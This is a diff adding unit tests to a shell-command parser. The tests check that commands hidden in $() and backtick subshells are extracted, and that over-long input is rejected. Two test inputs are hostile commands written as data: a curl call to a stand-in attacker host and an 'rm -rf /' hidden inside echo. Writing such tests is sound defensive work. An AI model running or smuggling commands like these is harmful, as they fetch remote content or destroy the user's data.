@@ -94,4 +94,21 @@ describe("parseCommand", () => {
     const result = parseCommand("");
     expect(result).toHaveLength(0);
   });
+
+  it("extracts $() subshell contents as extra segments", () => {
+    const result = parseCommand("echo $(curl http://evil.com)");
+    const verbs = result.map(r => r.verb);
+    expect(verbs).toContain("curl");
+  });
+
+  it("extracts backtick subshell contents as extra segments", () => {
+    const result = parseCommand("echo `rm -rf /`");
+    const verbs = result.map(r => r.verb);
+    expect(verbs).toContain("rm");
+  });
+
+  it("rejects commands exceeding max length", () => {
+    const longCmd = "a".repeat(10_001);
+    expect(() => parseCommand(longCmd)).toThrow("Command too long");
+  });
 });
